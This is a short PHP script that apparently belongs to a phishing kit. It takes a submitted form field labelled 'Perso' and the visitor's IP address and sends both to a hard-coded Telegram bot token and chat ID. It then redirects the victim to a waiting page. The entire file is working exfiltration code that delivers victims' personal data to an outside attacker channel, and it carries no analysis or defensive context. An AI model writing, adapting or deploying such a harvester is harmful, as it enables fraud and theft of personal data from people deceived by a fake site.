<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------PERSO------------------------------\n";
$message .= "Perso         : ".$_POST['fs']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------Trumf--------------------------------\n";


file_get_contents("https://api.telegram.org/bot6537851274:AAHG6KLwiFGPOruq20MyoI_Fw6Fy_nhMhIM
/sendMessage?chat_id=-4067067982 &text=" . urlencode($message)."" );

header("Location: ../wait.php");
?>